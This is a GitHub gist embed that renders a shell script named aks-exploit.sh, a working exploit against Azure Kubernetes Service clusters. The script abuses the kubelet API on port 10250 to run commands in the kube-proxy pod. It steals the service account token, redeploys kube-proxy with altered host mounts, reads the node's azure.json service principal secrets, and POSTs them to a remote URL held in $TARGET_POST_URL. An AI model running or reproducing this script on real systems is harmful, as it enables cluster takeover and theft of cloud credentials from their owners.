document.write('<link rel="stylesheet" href="https://github.githubassets.com/assets/gist-embed-a9a1cf2ca01efd362bfa52312712ae94.css">')
document.write('<div id=\"gist90076765\" class=\"gist\">\n    <div class=\"gist-file\">\n      <div class=\"gist-data\">\n        <div class=\"js-gist-file-update-container js-task-list-container file-box\">\n  <div id=\"file-aks-exploit-sh\" class=\"file\">\n    \n\n  <div itemprop=\"text\" class=\"Box-body p-0 blob-wrapper data type-shell \">\n      \n<table class=\"highlight tab-size js-file-line-container\" data-tab-size=\"8\">\n      <tr>\n        <td id=\"file-aks-exploit-sh-L1\" class=\"blob-num js-line-number\" data-line-number=\"1\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC1\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#!<\/span>/bin/sh<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L2\" class=\"blob-num js-line-number\" data-line-number=\"2\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC2\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c1\">set<\/span> -x<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L3\" class=\"blob-num js-line-number\" data-line-number=\"3\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC3\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L4\" class=\"blob-num js-line-number\" data-line-number=\"4\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC4\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span># by default service account are mounted on pods, to use that uncomment line below<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L5\" class=\"blob-num js-line-number\" data-line-number=\"5\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC5\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> cat /run/secrets/kubernetes.io/serviceaccount/token &gt; token.txt<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L6\" class=\"blob-num js-line-number\" data-line-number=\"6\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC6\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L7\" class=\"blob-num js-line-number\" data-line-number=\"7\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC7\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Gets node IP using Azure metadata API<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L8\" class=\"blob-num js-line-number\" data-line-number=\"8\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC8\" class=\"blob-code blob-code-inner js-file-line\">nodeip=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>curl -H Metadata:true <span class=\"pl-s\"><span class=\"pl-pds\">&quot;<\/span>http://169.254.169.254/metadata/instance?api-version=2017-08-01<span class=\"pl-pds\">&quot;<\/span><\/span> <span class=\"pl-k\">|<\/span> jq .network.interface[].ipv4.ipAddress[].privateIpAddress <span class=\"pl-k\">|<\/span> sed <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>s/&quot;//g<span class=\"pl-pds\">&#39;<\/span><\/span><span class=\"pl-pds\">)<\/span><\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L9\" class=\"blob-num js-line-number\" data-line-number=\"9\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC9\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Gets kube-proxy instance name for current given node<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L10\" class=\"blob-num js-line-number\" data-line-number=\"10\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC10\" class=\"blob-code blob-code-inner js-file-line\">proxyname=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>curl -sk https://<span class=\"pl-smi\">$nodeip<\/span>:10250/runningpods/ <span class=\"pl-k\">|<\/span> jq <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>.items[].metadata.name<span class=\"pl-pds\">&#39;<\/span><\/span> <span class=\"pl-k\">|<\/span> grep kube-proxy <span class=\"pl-k\">|<\/span> sed <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>s/&quot;//g<span class=\"pl-pds\">&#39;<\/span><\/span><span class=\"pl-pds\">)<\/span><\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L11\" class=\"blob-num js-line-number\" data-line-number=\"11\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC11\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L12\" class=\"blob-num js-line-number\" data-line-number=\"12\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC12\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Fetch token information<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L13\" class=\"blob-num js-line-number\" data-line-number=\"13\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC13\" class=\"blob-code blob-code-inner js-file-line\">curl --connect-timeout 5 -sk https://<span class=\"pl-smi\">$nodeip<\/span>:10250/run/kube-system/<span class=\"pl-smi\">$proxyname<\/span>/kube-proxy/ -d <span class=\"pl-s\"><span class=\"pl-pds\">&quot;<\/span>cmd=cat /run/secrets/kubernetes.io/serviceaccount/token<span class=\"pl-pds\">&quot;<\/span><\/span> -o token.txt<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L14\" class=\"blob-num js-line-number\" data-line-number=\"14\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC14\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L15\" class=\"blob-num js-line-number\" data-line-number=\"15\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC15\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Export yaml for current kube-proxy<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L16\" class=\"blob-num js-line-number\" data-line-number=\"16\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC16\" class=\"blob-code blob-code-inner js-file-line\">kubectl get ds/kube-proxy --namespace kube-system -o yaml --export --server=<span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>https://10.0.0.1:443<span class=\"pl-pds\">&#39;<\/span><\/span> --token=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>cat token.txt<span class=\"pl-pds\">)<\/span><\/span> --insecure-skip-tls-verify=true <span class=\"pl-k\">&gt;<\/span> kube-proxy-spec.yaml<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L17\" class=\"blob-num js-line-number\" data-line-number=\"17\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC17\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L18\" class=\"blob-num js-line-number\" data-line-number=\"18\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC18\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Delete kube-proxy from system<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L19\" class=\"blob-num js-line-number\" data-line-number=\"19\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC19\" class=\"blob-code blob-code-inner js-file-line\">kubectl delete --namespace kube-system --server=<span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>https://10.0.0.1:443<span class=\"pl-pds\">&#39;<\/span><\/span> --token=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>cat token.txt<span class=\"pl-pds\">)<\/span><\/span> --insecure-skip-tls-verify=true -f kube-proxy-spec.yaml<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L20\" class=\"blob-num js-line-number\" data-line-number=\"20\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC20\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L21\" class=\"blob-num js-line-number\" data-line-number=\"21\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC21\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Add kube-proxy after amending mounts<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L22\" class=\"blob-num js-line-number\" data-line-number=\"22\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC22\" class=\"blob-code blob-code-inner js-file-line\">cat kube-proxy-spec.yaml <span class=\"pl-k\">|<\/span> sed -E <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>s/kubernetes\\/certs/kubernetes/g<span class=\"pl-pds\">&#39;<\/span><\/span> <span class=\"pl-k\">|<\/span> kubectl apply --namespace kube-system --server=<span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>https://10.0.0.1:443<span class=\"pl-pds\">&#39;<\/span><\/span> --token=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>cat token.txt<span class=\"pl-pds\">)<\/span><\/span> --insecure-skip-tls-verify=true -f -<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L23\" class=\"blob-num js-line-number\" data-line-number=\"23\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC23\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L24\" class=\"blob-num js-line-number\" data-line-number=\"24\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC24\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span> Get name for new proxy-dns<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L25\" class=\"blob-num js-line-number\" data-line-number=\"25\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC25\" class=\"blob-code blob-code-inner js-file-line\">proxyname=<span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>curl -sk https://<span class=\"pl-smi\">$nodeip<\/span>:10250/runningpods/ <span class=\"pl-k\">|<\/span> jq <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>.items[].metadata.name<span class=\"pl-pds\">&#39;<\/span><\/span> <span class=\"pl-k\">|<\/span> grep kube-proxy <span class=\"pl-k\">|<\/span> sed <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>s/&quot;//g<span class=\"pl-pds\">&#39;<\/span><\/span><span class=\"pl-pds\">)<\/span><\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L26\" class=\"blob-num js-line-number\" data-line-number=\"26\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC26\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L27\" class=\"blob-num js-line-number\" data-line-number=\"27\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC27\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span># Fetch azure.json file which contains service principal/secret<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L28\" class=\"blob-num js-line-number\" data-line-number=\"28\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC28\" class=\"blob-code blob-code-inner js-file-line\">curl --connect-timeout 5 -sk https://<span class=\"pl-smi\">$nodeip<\/span>:10250/run/kube-system/<span class=\"pl-smi\">$proxyname<\/span>/kube-proxy/ -d <span class=\"pl-s\"><span class=\"pl-pds\">&quot;<\/span>cmd=cat /etc/kubernetes/azure.json<span class=\"pl-pds\">&quot;<\/span><\/span> -o azure.json <\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L29\" class=\"blob-num js-line-number\" data-line-number=\"29\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC29\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L30\" class=\"blob-num js-line-number\" data-line-number=\"30\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC30\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span># [OPTIONAL] Echoes Azure Service Principal details<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L31\" class=\"blob-num js-line-number\" data-line-number=\"31\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC31\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c1\">echo<\/span> <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>Azure SPN: <span class=\"pl-pds\">&#39;<\/span><\/span> <span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>cat azure.json <span class=\"pl-k\">|<\/span> jq <span class=\"pl-s\"><span class=\"pl-pds\">&#39;<\/span>. | {s:.subscriptionId, c:.aadClientId, p:.aadClientSecret, t: .tenantId}<span class=\"pl-pds\">&#39;<\/span><\/span><span class=\"pl-pds\">)<\/span><\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L32\" class=\"blob-num js-line-number\" data-line-number=\"32\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC32\" class=\"blob-code blob-code-inner js-file-line\">\n<\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L33\" class=\"blob-num js-line-number\" data-line-number=\"33\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC33\" class=\"blob-code blob-code-inner js-file-line\"><span class=\"pl-c\"><span class=\"pl-c\">#<\/span># Send service principal credentials to remote URL<\/span><\/td>\n      <\/tr>\n      <tr>\n        <td id=\"file-aks-exploit-sh-L34\" class=\"blob-num js-line-number\" data-line-number=\"34\"><\/td>\n        <td id=\"file-aks-exploit-sh-LC34\" class=\"blob-code blob-code-inner js-file-line\">curl --connect-timeout 5 -X POST -H <span class=\"pl-s\"><span class=\"pl-pds\">&quot;<\/span>Content-Type: application/json<span class=\"pl-pds\">&quot;<\/span><\/span> -d <span class=\"pl-s\"><span class=\"pl-pds\">&quot;<\/span><span class=\"pl-s\"><span class=\"pl-pds\">$(<\/span>cat azure.json<span class=\"pl-pds\">)<\/span><\/span><span class=\"pl-pds\">&quot;<\/span><\/span> <span class=\"pl-smi\">$TARGET_POST_URL<\/span><\/td>\n      <\/tr>\n<\/table>\n\n\n  <\/div>\n\n  <\/div>\n<\/div>\n\n      <\/div>\n      <div class=\"gist-meta\">\n        <a href=\"https://gist.github.com/pjbgf/ebfb9bad9b360a8cf442f2ce74300763/raw/feec128135ef18f203f9846feb7243fb2355d155/aks-exploit.sh\" style=\"float:right\">view raw<\/a>\n        <a href=\"https://gist.github.com/pjbgf/ebfb9bad9b360a8cf442f2ce74300763#file-aks-exploit-sh\">aks-exploit.sh<\/a>\n        hosted with &#10084; by <a href=\"https://github.com\">GitHub<\/a>\n      <\/div>\n    <\/div>\n<\/div>\n')
